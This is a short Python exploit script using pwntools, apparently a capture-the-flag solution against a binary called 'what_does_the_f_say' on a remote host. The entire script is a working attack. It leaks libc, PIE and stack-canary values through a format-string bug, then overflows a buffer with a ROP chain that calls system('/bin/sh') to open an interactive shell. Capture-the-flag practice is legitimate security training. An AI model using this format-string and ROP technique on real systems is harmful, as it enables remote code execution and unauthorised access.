from pwn import *

context.binary = binary = ELF('./what_does_the_f_say',checksec=False)
libc = ELF('libc6_2.27-3ubuntu1.2_amd64.so',checksec=False)

def fmt_leak(idx):
	p.sendline(b'1')
	p.sendline(b'2')
	p.sendlineafter(b'Red or Green Kryptonite?\n', f'%{idx}$p'.encode())

	leak = int(p.recvline()[:-1].decode(), 16)

	return leak


p = remote('83.136.250.52', 38085)


libc_leak = fmt_leak(3)
info(f'libc leak: {hex(libc_leak)}')

libc.address = libc_leak - 0x110191
info(f'libc base: {hex(libc.address)}')

pie_leak = fmt_leak(15)
info(f'pie leak: {hex(pie_leak)}')

binary.address = pie_leak - 0x174a
info(f'pie base: {hex(binary.address)}')

canary = fmt_leak(13)
info(f'canary: {hex(canary)}')



for _ in range(4):
	p.sendline(b'2')
	p.sendline(b'3')

p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'pwned')


rop = ROP(binary)

pop_rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
ret = p64(rop.find_gadget(['ret'])[0])

system = p64(libc.symbols.system)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))


payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8
payload += pop_rdi
payload += bin_sh
payload += ret
payload += system

p.sendlineafter(b'You have less than 20 space rocks! Are you sure you want to buy it?\n', payload)


p.interactive()
